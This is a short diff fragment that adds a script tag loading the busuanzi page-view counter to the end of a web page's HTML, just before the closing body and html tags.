+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
